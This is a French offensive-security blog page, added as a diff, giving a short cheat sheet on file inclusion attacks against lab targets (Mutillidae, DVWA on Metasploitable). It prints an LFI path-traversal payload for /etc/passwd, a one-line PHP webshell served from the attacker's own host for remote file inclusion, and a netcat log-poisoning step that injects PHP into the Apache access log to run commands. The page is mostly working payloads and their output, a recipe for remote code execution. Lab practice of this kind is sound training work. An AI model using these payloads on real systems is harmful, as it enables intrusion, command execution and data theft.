@@ -1,0 +1,357 @@
+<!DOCTYPE html>
+<html lang="fr">
+    
+    
+
+
+    <head>
+    <link href="https://gmpg.org/xfn/11" rel="profile">
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta http-equiv="Cache-Control" content="public" />
+<!-- Enable responsiveness on mobile devices -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="generator" content="Hugo 0.78.2" />
+
+    
+    
+    
+
+<title>Web - File Inclusion • LOLOLEKIK</title>
+
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Web - File Inclusion"/>
+<meta name="twitter:description" content="Introduction Les file inclusion permettent de chercher des fichiers localement (LFI) ou sur un serveur distant (RFI) afin de les afficher.
+LFI payload
+http://192.168.1.91/mutillidae/index.php?page=../../../../../../../../../../etc/passwd  RFI &amp; Simple WEBSHELL Sur notre machine on créé un fichier lololekik.php
+&lt;?php shell_exec($_GET[&#39;lolo&#39;]) ?&gt;Démarrage du serveur web
+┌──(lololekik㉿Ashitaka)-[~/metasploitable] └─$ python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... Puis utiliser la commande suivante pour utiliser le webshell
+http://192.168.1.91/dvwa/vulnerabilities/fi/?page=http://192.168.1.86:8000/lololekik.php&amp;lolo=ifconfig LFI &amp; Log poisonning Il est possible de contaminer plusieurs fichiers de log voici l&rsquo;exemple avec /var/log/apache2/access."/>
+
+<meta property="og:title" content="Web - File Inclusion" />
+<meta property="og:description" content="Introduction Les file inclusion permettent de chercher des fichiers localement (LFI) ou sur un serveur distant (RFI) afin de les afficher.
+LFI payload
+http://192.168.1.91/mutillidae/index.php?page=../../../../../../../../../../etc/passwd  RFI &amp; Simple WEBSHELL Sur notre machine on créé un fichier lololekik.php
+&lt;?php shell_exec($_GET[&#39;lolo&#39;]) ?&gt;Démarrage du serveur web
+┌──(lololekik㉿Ashitaka)-[~/metasploitable] └─$ python -m SimpleHTTPServer Serving HTTP on 0.0.0.0 port 8000 ... Puis utiliser la commande suivante pour utiliser le webshell
+http://192.168.1.91/dvwa/vulnerabilities/fi/?page=http://192.168.1.86:8000/lololekik.php&amp;lolo=ifconfig LFI &amp; Log poisonning Il est possible de contaminer plusieurs fichiers de log voici l&rsquo;exemple avec /var/log/apache2/access." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://lololekik.com/cuisine/lfi/" />
+<meta property="og:site_name" content="OffSec &amp; CO" />
+
+
+    
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/qtcreator_dark.min.css">
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/scss/hyde-hyde.816e5b26c5966343ef21f902ba05a763964deb2ae3fdcd9a954614131b756c59.css" integrity="sha256-gW5bJsWWY0PvIfkCugWnY5ZN6yrj/c2alUYUExt1bFk=">
+
+
+<link rel="stylesheet" href="/scss/print.2744dcbf8a0b2e74f8a50e4b34e5f441be7cf93cc7de27029121c6a09f9e77bc.css" integrity="sha256-J0Tcv4oLLnT4pQ5LNOX0Qb58&#43;TzH3icCkSHGoJ&#43;ed7w=" media="print">
+
+
+    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+    <![endif]-->
+    <!-- Icons -->
+    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/apple-touch-icon-144-precomposed.png">
+    <link rel="shortcut icon" href="/favicon.png">
+    
+    <link rel="stylesheet" href="/css/custom.css">
+
+
+
+
+
+</head>
+
+
+    <body class=" ">
+    
+<div class="sidebar">
+  <div class="container ">
+    <div class="sidebar-about">
+      <span class="site__title">
+        <a href="http://lololekik.com/">LOLOLEKIK</a>
+      </span>
+      
+        
+        
+        
+        <div class="author-image">
+          <img src="http://lololekik.com/img/author.jpg" alt="Author Image" class="img--circle img--headshot element--center">
+        </div>
+        
+      
+      
+      <p class="site__description">
+         OffSec &amp; Co 
+      </p>
+    </div>
+    <div class="collapsible-menu">
+      <input type="checkbox" id="menuToggle">
+      <label for="menuToggle">LOLOLEKIK</label>
+      <div class="menu-content">
+        <div>
+	<ul class="sidebar-nav">
+		 
+		 
+			 
+				<li>
+					<a href="/cuisine/">
+						<span>Cuisine</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/exploit/">
+						<span>Exploit</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/network/">
+						<span>Network</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/writeups/">
+						<span>WriteUps</span>
+					</a>
+				</li>
+			 
+		 
+			 
+				<li>
+					<a href="/hack-the-box/">
+						<span>HackTheBox</span>
+					</a>
+				</li>
+			 
+		
+	</ul>
+</div>
+
+        <section class="social">
+	
+	
+	
+	<a href="https://github.com/LOLOLEKIK" rel="me"><i class="fab fa-github fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	<a href="https://root-me.org/lololekik" target="blank" class="linklogo"><div class="rootme_logo logohover"> </div></a>
+	
+	
+	<a href="https://hackthebox.eu/home/users/profile/202145" target="blank" class="linklogo"><div class="hackthebox_logo logohover"> </div></a>
+	
+	
+	<a href="https://linkedin.com/in/loris-thiebaut-8b4b85197" rel="me"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a>
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	<a href="mailto:loris.thiebaut@gmail.com" rel="me"><i class="fas fa-at fa-lg" aria-hidden="true"></i></a>
+	
+</section>
+
+      </div>
+    </div>
+    
+
+<div class="builtwith">
+Built with <a href="https://gohugo.io">Hugo</a> ❤️ <a href="https://github.com/htr3n/hyde-hyde">hyde-hyde</a>.
+</div>
+
+
+  </div>
+</div>
+
+        <div class="content container">
+            
+    
+<article>
+  <header>
+    <h1>Web - File Inclusion</h1>
+    
+    
+<div class="post__meta">
+    
+    
+    
+    
+      
+      
+          in
+          
+          
+              <a class="badge badge-category" href="/categories/cuisine">CUISINE</a>
+              
+          
+      
+    
+    
+    
+      
+      
+          <br/>
+           <i class="fas fa-tags"></i>
+          
+          <a class="badge badge-tag" href="/tags/lfi">lfi</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/rfi">rfi</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/log-poisonning">log poisonning</a>
+           
+      
+          <a class="badge badge-tag" href="/tags/web">web</a>
+          
+      
+    
+    
+    <br/>
+    <i class="fas fa-clock"></i> 1 min read
+</div>
+
+
+  </header>
+  
+  
+  <div class="post">
+    <h1 id="introduction">Introduction</h1>
+<p>Les file inclusion permettent de chercher des fichiers localement (LFI) ou sur un serveur distant (RFI) afin de les afficher.</p>
+<h1 id="lfi">LFI</h1>
+<p>payload</p>
+<pre><code class="language-"shell" data-lang=""shell">http://192.168.1.91/mutillidae/index.php?page=../../../../../../../../../../etc/passwd
+</code></pre>
+
+
+  <img src="/img/lfi/lfi.png" alt="lfi" class="imageformat"/>
+
+<h1 id="rfi--simple-webshell">RFI &amp; Simple WEBSHELL</h1>
+<p>Sur notre machine on créé un fichier lololekik.php</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+
+<span style="color:#a6e22e">shell_exec</span>($_GET[<span style="color:#e6db74">&#39;lolo&#39;</span>])
+
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div><p>Démarrage du serveur web</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh"> ┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/metasploitable<span style="color:#f92672">]</span>
+└─$ python -m SimpleHTTPServer                  
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> ...
+</code></pre></div><p>Puis utiliser la commande suivante pour utiliser le webshell</p>
+<pre><code class="language-"shell" data-lang=""shell">http://192.168.1.91/dvwa/vulnerabilities/fi/?page=http://192.168.1.86:8000/lololekik.php&amp;lolo=ifconfig
+</code></pre><h1 id="lfi--log-poisonning">LFI &amp; Log poisonning</h1>
+<p>Il est possible de contaminer plusieurs fichiers de log voici l&rsquo;exemple avec /var/log/apache2/access.log</p>
+<p>Via netcat on contamine le fichier</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-zsh" data-lang="zsh">┌──<span style="color:#f92672">(</span>lololekik㉿Ashitaka<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/metasploitable<span style="color:#f92672">]</span>
+└─$ nc -vn 192.168.1.91 <span style="color:#ae81ff">80</span>                                                                                                                                                                                                             <span style="color:#ae81ff">1</span> ⨯
+<span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>192.168.1.91<span style="color:#f92672">]</span> <span style="color:#ae81ff">80</span> <span style="color:#f92672">(</span>http<span style="color:#f92672">)</span> open
+&lt;?php echo <span style="color:#e6db74">&#39;&lt;pre&gt;&#39;</span> . shell_exec<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;lolo&#39;</span><span style="color:#f92672">])</span> . <span style="color:#e6db74">&#39;&lt;/pre&gt;&#39;</span> ; ?&gt;
+
+HTTP/1.1 <span style="color:#ae81ff">400</span> Bad Request
+Date: Tue, <span style="color:#ae81ff">19</span> Jan <span style="color:#ae81ff">2021</span> 21:57:17 GMT
+Server: Apache/2.2.8 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span> DAV/2
+Content-Length: <span style="color:#ae81ff">323</span>
+Connection: close
+Content-Type: text/html; charset<span style="color:#f92672">=</span>iso-8859-1
+
+&lt;!DOCTYPE HTML PUBLIC <span style="color:#e6db74">&#34;-//IETF//DTD HTML 2.0//EN&#34;</span>&gt;
+&lt;html&gt;&lt;head&gt;
+&lt;title&gt;400 Bad Request&lt;/title&gt;
+&lt;/head&gt;&lt;body&gt;
+&lt;h1&gt;Bad Request&lt;/h1&gt;
+&lt;p&gt;Your browser sent a request that this server could not understand.&lt;br /&gt;
+&lt;/p&gt;
+&lt;hr&gt;
+&lt;address&gt;Apache/2.2.8 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span> DAV/2 Server at metasploitable.localdomain Port 80&lt;/address&gt;
+&lt;/body&gt;&lt;/html&gt;
+
+</code></pre></div><p>url utilisé : http://192.168.1.91/mutillidae/index.php?page=../../../../../../var/log/apache2/access.log&amp;lolo=cat%20/etc/passwd</p>
+
+
+
+  <img src="/img/lfi/log.png" alt="lfi &amp; log" class="imageformat"/>
+
+
+  </div>
+  
+
+<div class="navigation navigation-single">
+    
+    <a href="/cuisine/sqli/" class="navigation-prev">
+      <i aria-hidden="true" class="fa fa-chevron-left"></i>
+      <span class="navigation-tittle">Web - SQLi </span>
+    </a>
+    
+    
+    <a href="/cuisine/upgradere/" class="navigation-next">
+      <span class="navigation-tittle">Upgrade Reverse Shell</span>
+      <i aria-hidden="true" class="fa fa-chevron-right"></i>
+    </a>
+    
+</div>
+
+
+  
+
+  
+    
+
+
+</article>
+
+
+        </div>
+        
+    
+
+<script defer src="https://use.fontawesome.com/releases/v5.11.2/js/all.js" integrity="sha384-b3ua1l97aVGAPEIe48b4TC60WUQbQaGi2jqAWM90y0OZXZeyaTCWtBTKtjW2GXG1" crossorigin="anonymous"></script>
+
+
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js"></script>
+        
+    <script type="text/javascript">
+        
+        hljs.initHighlightingOnLoad();
+    </script>
+    
+
+
+
+    
+
+
+
+    </body>
+</html>
